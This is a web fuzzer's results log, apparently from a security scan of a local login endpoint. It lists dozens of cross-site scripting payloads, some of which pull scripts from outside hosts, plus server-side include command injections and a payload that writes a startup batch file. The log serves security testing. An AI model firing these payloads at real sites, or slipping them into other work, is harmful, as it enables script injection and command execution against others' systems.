Task ID,Message Type,Req. Timestamp,Método,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
15,Fuzzed,Mon Jun 01 18:51:46 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,362,448,115,332,26,,,[&#60;BGSOUND SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;]
16,Fuzzed,Mon Jun 01 18:51:46 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,325,448,119,332,26,,,[&#60;BODY BACKGROUND&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;]
17,Fuzzed,Mon Jun 01 18:51:46 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,228,447,85,332,26,,,[&#60;BODY ONLOAD&#61;alert&#40;&#39;XSS&#39;&#41;&#62;]
18,Fuzzed,Mon Jun 01 18:51:46 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,274,448,143,332,26,,,[&#60;DIV STYLE&#61;&#34;background-image&#58; url&#40;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#41;&#34;&#62;]
19,Fuzzed,Mon Jun 01 18:51:46 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,210,448,159,332,26,,,[&#60;DIV STYLE&#61;&#34;background-image&#58; url&#40;&#38;&#35;1&#59;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#41;&#34;&#62;]
20,Fuzzed,Mon Jun 01 18:51:46 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,209,448,129,332,26,,,[&#60;DIV STYLE&#61;&#34;width&#58; expression&#40;alert&#40;&#39;XSS&#39;&#41;&#41;&#59;&#34;&#62;]
21,Fuzzed,Mon Jun 01 18:51:46 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,228,448,154,332,26,,,[&#60;FRAMESET&#62;&#60;FRAME SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;&#60;&#47;FRAMESET&#62;]
22,Fuzzed,Mon Jun 01 18:51:46 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,243,448,135,332,26,,,[&#60;IFRAME SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;&#60;&#47;IFRAME&#62;]
23,Fuzzed,Mon Jun 01 18:51:46 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,230,448,138,332,26,,,[&#60;INPUT TYPE&#61;&#34;IMAGE&#34; SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;]
24,Fuzzed,Mon Jun 01 18:51:46 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,218,448,111,332,26,,,[&#60;IMG SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;]
25,Fuzzed,Mon Jun 01 18:51:46 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,220,447,96,332,26,,,[&#60;IMG SRC&#61;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#62;]
26,Fuzzed,Mon Jun 01 18:51:46 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,223,448,114,332,26,,,[&#60;IMG DYNSRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;]
27,Fuzzed,Mon Jun 01 18:51:46 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,216,448,114,332,26,,,[&#60;IMG LOWSRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;]
28,Fuzzed,Mon Jun 01 18:51:46 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,252,448,161,332,26,,,[&#60;IMG SRC&#61;&#34;http&#58;&#47;&#47;www.thesiteyouareon.com&#47;somecommand.php&#63;somevariables&#61;maliciouscode&#34;&#62;]
29,Fuzzed,Mon Jun 01 18:51:46 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,275,448,201,332,26,,,[&#60;STYLE&#62;li &#123;list-style-image&#58; url&#40;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#34;&#41;&#59;&#125;&#60;&#47;STYLE&#62;&#60;UL&#62;&#60;LI&#62;XSS]
30,Fuzzed,Mon Jun 01 18:51:47 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,281,448,105,332,26,,,[&#60;IMG SRC&#61;&#39;vbscript&#58;msgbox&#40;&#34;XSS&#34;&#41;&#39;&#62;]
31,Fuzzed,Mon Jun 01 18:51:47 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,267,448,135,332,26,,,[&#60;LAYER SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;scriptlet.html&#34;&#62;&#60;&#47;LAYER&#62;]
32,Fuzzed,Mon Jun 01 18:51:47 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,312,447,92,332,26,,,[&#60;IMG SRC&#61;&#34;livescript&#58;&#91;code&#93;&#34;&#62;]
33,Fuzzed,Mon Jun 01 18:51:47 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,289,448,108,332,26,,,[&#37;BCscript&#37;BEalert&#40;&#37;A2XSS&#37;A2&#41;&#37;BC&#47;script&#37;BE]
34,Fuzzed,Mon Jun 01 18:51:47 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,287,448,163,332,26,,,[&#60;META HTTP-EQUIV&#61;&#34;refresh&#34; CONTENT&#61;&#34;0&#59;url&#61;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;]
35,Fuzzed,Mon Jun 01 18:51:47 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,243,448,189,332,26,,,"[&#60;META HTTP-EQUIV&#61;&#34;refresh&#34; CONTENT&#61;&#34;0&#59;url&#61;data&#58;text&#47;html&#59;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&#34;&#62;]"
36,Fuzzed,Mon Jun 01 18:51:47 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,276,448,196,332,26,,,[&#60;META HTTP-EQUIV&#61;&#34;refresh&#34; CONTENT&#61;&#34;0&#59; URL&#61;http&#58;&#47;&#47;&#59;URL&#61;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;]
37,Fuzzed,Mon Jun 01 18:51:47 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,231,447,87,332,26,,,[&#60;IMG SRC&#61;&#34;mocha&#58;&#91;code&#93;&#34;&#62;]
38,Fuzzed,Mon Jun 01 18:51:47 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,230,448,138,332,26,,,[&#60;STYLE TYPE&#61;&#34;text&#47;javascript&#34;&#62;alert&#40;&#39;XSS&#39;&#41;&#59;&#60;&#47;STYLE&#62;]
39,Fuzzed,Mon Jun 01 18:51:47 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,206,448,144,332,26,,,[&#60;IMG STYLE&#61;&#34;xss&#58;expr&#47;&#42;XSS&#42;&#47;ession&#40;alert&#40;&#39;XSS&#39;&#41;&#41;&#34;&#62;]
40,Fuzzed,Mon Jun 01 18:51:47 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,208,448,121,332,26,,,[&#60;XSS STYLE&#61;&#34;xss&#58;expression&#40;alert&#40;&#39;XSS&#39;&#41;&#41;&#34;&#62;]
41,Fuzzed,Mon Jun 01 18:51:47 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,224,448,215,332,26,,,[&#60;STYLE&#62;.XSS&#123;background-image&#58;url&#40;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#34;&#41;&#59;&#125;&#60;&#47;STYLE&#62;&#60;A CLASS&#61;XSS&#62;&#60;&#47;A&#62;]
42,Fuzzed,Mon Jun 01 18:51:47 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,228,448,195,332,26,,,[&#60;STYLE type&#61;&#34;text&#47;css&#34;&#62;BODY&#123;background&#58;url&#40;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#34;&#41;&#125;&#60;&#47;STYLE&#62;]
43,Fuzzed,Mon Jun 01 18:51:47 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,218,448,142,332,26,,,[&#60;LINK REL&#61;&#34;stylesheet&#34; HREF&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;]
44,Fuzzed,Mon Jun 01 18:51:47 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,234,448,137,332,26,,,[&#60;LINK REL&#61;&#34;stylesheet&#34; HREF&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.css&#34;&#62;]
45,Fuzzed,Mon Jun 01 18:51:47 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,289,448,135,332,26,,,[&#60;STYLE&#62;&#64;import&#39;http&#58;&#47;&#47;testsite.com&#47;xss.css&#39;&#59;&#60;&#47;STYLE&#62;]
46,Fuzzed,Mon Jun 01 18:51:47 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,269,448,175,332,26,,,[&#60;META HTTP-EQUIV&#61;&#34;Link&#34; Content&#61;&#34;&#60;http&#58;&#47;&#47;testsite.com&#47;xss.css&#62;&#59; REL&#61;stylesheet&#34;&#62;]
47,Fuzzed,Mon Jun 01 18:51:47 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,341,448,176,332,26,,,[&#60;STYLE&#62;BODY&#123;-moz-binding&#58;url&#40;&#34;http&#58;&#47;&#47;testsite.com&#47;xssmoz.xml&#35;xss&#34;&#41;&#125;&#60;&#47;STYLE&#62;]
48,Fuzzed,Mon Jun 01 18:51:47 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,340,448,135,332,26,,,[&#60;TABLE BACKGROUND&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#34;&#62;&#60;&#47;TABLE&#62;]
49,Fuzzed,Mon Jun 01 18:51:47 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,334,448,164,332,26,,,[&#60;TABLE&#62;&#60;TD BACKGROUND&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#34;&#62;&#60;&#47;TD&#62;&#60;&#47;TABLE&#62;]
50,Fuzzed,Mon Jun 01 18:51:48 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,311,448,253,332,26,,,[&#60;HTML xmlns&#58;xss&#62; &#60;&#63;import namespace&#61;&#34;xss&#34; implementation&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.htc&#34;&#62; &#60;xss&#58;xss&#62;XSS&#60;&#47;xss&#58;xss&#62; &#60;&#47;HTML&#62;]
51,Fuzzed,Mon Jun 01 18:51:48 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,283,448,355,332,26,,,[&#60;XML ID&#61;I&#62;&#60;X&#62;&#60;C&#62;&#60;&#33;&#91;CDATA&#91;&#60;IMG SRC&#61;&#34;javas&#93;&#93;&#62;&#60;&#33;&#91;CDATA&#91;cript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;&#93;&#93;&#62; &#60;&#47;C&#62;&#60;&#47;X&#62;&#60;&#47;xml&#62;&#60;SPAN DATASRC&#61;&#35;I DATAFLD&#61;C DATAFORMATAS&#61;HTML&#62;]
52,Fuzzed,Mon Jun 01 18:51:48 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,226,448,353,332,26,,,[&#60;XML ID&#61;&#34;xss&#34;&#62;&#60;I&#62;&#60;B&#62;&#60;IMG SRC&#61;&#34;javas&#60;&#33;-- --&#62;cript&#58;alert&#40;&#39;XSS&#39;&#41;&#34;&#62;&#60;&#47;B&#62;&#60;&#47;I&#62;&#60;&#47;XML&#62; &#60;SPAN DATASRC&#61;&#34;&#35;xss&#34; DATAFLD&#61;&#34;B&#34; DATAFORMATAS&#61;&#34;HTML&#34;&#62;&#60;&#47;SPAN&#62;]
53,Fuzzed,Mon Jun 01 18:51:48 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,229,448,226,332,26,,,[&#60;XML SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xsstest.xml&#34; ID&#61;I&#62;&#60;&#47;XML&#62; &#60;SPAN DATASRC&#61;&#35;I DATAFLD&#61;C DATAFORMATAS&#61;HTML&#62;&#60;&#47;SPAN&#62;]
54,Fuzzed,Mon Jun 01 18:51:48 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,232,448,173,332,26,,,[&#60;&#33;--&#91;if gte IE 4&#93;&#62; &#60;SCRIPT&#62;alert&#40;&#39;XSS&#39;&#41;&#59;&#60;&#47;SCRIPT&#62; &#60;&#33;&#91;endif&#93;--&#62;]
55,Fuzzed,Mon Jun 01 18:51:48 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,209,448,180,332,26,,,[&#60;META HTTP-EQUIV&#61;&#34;Set-Cookie&#34; Content&#61;&#34;USERID&#61;&#60;SCRIPT&#62;alert&#40;&#39;XSS&#39;&#41;&#60;&#47;SCRIPT&#62;&#34;&#62;]
56,Fuzzed,Mon Jun 01 18:51:48 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,247,448,140,332,26,,,[&#60;XSS STYLE&#61;&#34;behavior&#58; url&#40;http&#58;&#47;&#47;testsite.com&#47;xss.htc&#41;&#59;&#34;&#62;]
57,Fuzzed,Mon Jun 01 18:51:48 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,230,448,130,332,26,,,[&#60;SCRIPT SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.jpg&#34;&#62;&#60;&#47;SCRIPT&#62;]
58,Fuzzed,Mon Jun 01 18:51:48 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,230,448,108,332,26,,,[&#60;BR SIZE&#61;&#34;&#38;&#123;alert&#40;&#39;XSS&#39;&#41;&#125;&#34;&#62;]
59,Fuzzed,Mon Jun 01 18:51:48 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,242,447,96,332,26,,,[&#60;IMG SRC&#61;JaVaScRiPt&#58;alert&#40;&#39;XSS&#39;&#41;&#62;]
60,Fuzzed,Mon Jun 01 18:51:48 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,285,448,114,332,26,,,[&#60;IMG SRC&#61;javascript&#58;alert&#40;&#38;quot&#59;XSS&#38;quot&#59;&#41;&#62;]
61,Fuzzed,Mon Jun 01 18:51:48 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,271,448,120,332,26,,,"[&#60;IMG SRC&#61;javascript&#58;alert&#40;String.fromCharCode&#40;88,83,83&#41;&#41;&#62;]"
62,Fuzzed,Mon Jun 01 18:51:48 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,297,448,121,332,26,,,[&#60;&#47;TITLE&#62;&#60;SCRIPT&#62;alert&#40;&#34;XSS&#34;&#41;&#59;&#60;&#47;SCRIPT&#62;]
63,Fuzzed,Mon Jun 01 18:51:48 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,292,448,155,332,26,,,[&#60;STYLE&#62;&#64;im&#92;port&#39;&#92;ja&#92;vasc&#92;ript&#58;alert&#40;&#34;XSS&#34;&#41;&#39;&#59;&#60;&#47;STYLE&#62;]
64,Fuzzed,Mon Jun 01 18:51:48 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,316,448,112,332,26,,,[&#60;IMG SRC&#61;&#34;jav ascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;]
65,Fuzzed,Mon Jun 01 18:51:48 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,286,448,129,332,26,,,[&#60;IMG SRC&#61;&#34;jav&#38;&#35;x09&#59;ascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;]
66,Fuzzed,Mon Jun 01 18:51:48 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,283,448,129,332,26,,,[&#60;IMG SRC&#61;&#34;jav&#38;&#35;x0A&#59;ascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;]
67,Fuzzed,Mon Jun 01 18:51:48 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,251,448,129,332,26,,,[&#60;IMG SRC&#61;&#34;jav&#38;&#35;x0D&#59;ascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;]
68,Fuzzed,Mon Jun 01 18:51:49 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,239,448,133,332,26,,,[&#60;IMG SRC &#61; &#34; j a v a s c r i p t &#58; a l e r t &#40; &#39; X S S &#39; &#41; &#34; &#62;]
69,Fuzzed,Mon Jun 01 18:51:49 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,212,448,150,332,26,,,[perl -e &#39;print &#34;&#60;IMG SRC&#61;java&#92;0script&#58;alert&#40;&#34;XSS&#34;&#41;&#62;&#34;&#59;&#39;&#62; out]
70,Fuzzed,Mon Jun 01 18:51:49 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,182,448,162,332,26,,,[perl -e &#39;print &#34;&#38;&#60;SCR&#92;0IPT&#62;alert&#40;&#34;XSS&#34;&#41;&#60;&#47;SCR&#92;0IPT&#62;&#34;&#59;&#39; &#62; out]
71,Fuzzed,Mon Jun 01 18:51:49 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,234,448,130,332,26,,,[&#60;IMG SRC&#61;&#34; &#38;&#35;14&#59; javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;]
72,Fuzzed,Mon Jun 01 18:51:49 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,231,448,137,332,26,,,[&#60;SCRIPT&#47;XSS SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.js&#34;&#62;&#60;&#47;SCRIPT&#62;]
73,Fuzzed,Mon Jun 01 18:51:49 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,239,448,196,332,26,,,"[&#60;BODY onload&#33;&#35;&#36;&#37;&#38;&#40;&#41;&#42;&#126;&#43;-_.,&#58;&#59;&#63;&#64;&#91;&#47;&#124;&#92;&#93;&#94;&#96;&#61;alert&#40;&#34;XSS&#34;&#41;&#62;]"
74,Fuzzed,Mon Jun 01 18:51:49 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,224,447,93,332,26,,,[&#60;SCRIPT SRC&#61;http&#58;&#47;&#47;testsite.com&#47;xss.js]
75,Fuzzed,Mon Jun 01 18:51:49 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,215,447,85,332,26,,,[&#60;SCRIPT SRC&#61;&#47;&#47;testsite.com&#47;.j&#62;]
76,Fuzzed,Mon Jun 01 18:51:49 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,183,448,101,332,26,,,[&#60;IMG SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#34;]
77,Fuzzed,Mon Jun 01 18:51:49 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,191,448,107,332,26,,,[&#60;IFRAME SRC&#61;http&#58;&#47;&#47;testsite.com&#47;scriptlet.html &#60;]
78,Fuzzed,Mon Jun 01 18:51:49 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,191,448,121,332,26,,,[&#60;&#60;SCRIPT&#62;alert&#40;&#34;XSS&#34;&#41;&#59;&#47;&#47;&#60;&#60;&#47;SCRIPT&#62;]
79,Fuzzed,Mon Jun 01 18:51:49 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,189,448,135,332,26,,,[&#60;IMG &#34;&#34;&#34;&#62;&#60;SCRIPT&#62;alert&#40;&#34;XSS&#34;&#41;&#60;&#47;SCRIPT&#62;&#34;&#62;]
80,Fuzzed,Mon Jun 01 18:51:49 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,230,448,111,332,26,,,[&#60;SCRIPT&#62;a&#61;&#47;XSS&#47; alert&#40;a.source&#41;&#60;&#47;SCRIPT&#62;]
81,Fuzzed,Mon Jun 01 18:51:49 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,221,448,170,332,26,,,[&#60;P STYLE&#61;&#34;behavior&#58;url&#40;&#39;&#35;default&#35;time2&#39;&#41;&#34; onEnd&#61;&#34;alert&#40;&#39;XSS&#39;&#41;&#34;&#62;]
82,Fuzzed,Mon Jun 01 18:51:49 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,196,448,151,332,26,,,[&#60;SCRIPT a&#61;&#34;&#62;&#34; SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.js&#34;&#62;&#60;&#47;SCRIPT&#62;]
83,Fuzzed,Mon Jun 01 18:51:49 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,268,448,149,332,26,,,[&#60;SCRIPT &#61;&#34;blah&#34; SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.js&#34;&#62;&#60;&#47;SCRIPT&#62;]
84,Fuzzed,Mon Jun 01 18:51:49 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,337,448,161,332,26,,,[&#60;SCRIPT a&#61;&#34;blah&#34; &#39;&#39; SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.js&#34;&#62;&#60;&#47;SCRIPT&#62;]
89,Fuzzed,Mon Jun 01 18:51:50 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,14,448,141,286,1109,,,"[<!--#exec cmd=""/bin/echo '<SCRIPT SRC'""--><!--#exec cmd=""/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'""-->]"
90,Fuzzed,Mon Jun 01 18:51:50 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,17,447,95,286,1107,,,"[<!--#exec cmd=""""/usr/X11R6/bin/xterm ?display 127.0.0.1:0 &""""-->]"
85,Fuzzed,Mon Jun 01 18:51:49 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,326,448,161,332,26,,,[&#60;SCRIPT &#34;a&#61;&#39;&#62;&#39;&#34; SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.js&#34;&#62;&#60;&#47;SCRIPT&#62;]
92,Fuzzed,Mon Jun 01 18:51:50 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,19,448,121,286,1109,,,"[firefoxurl:test|""%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');""]"
91,Fuzzed,Mon Jun 01 18:51:50 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,23,448,145,286,1109,,,"[aim: &c:\windows\system32\calc.exe"" ini=""C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat""]"
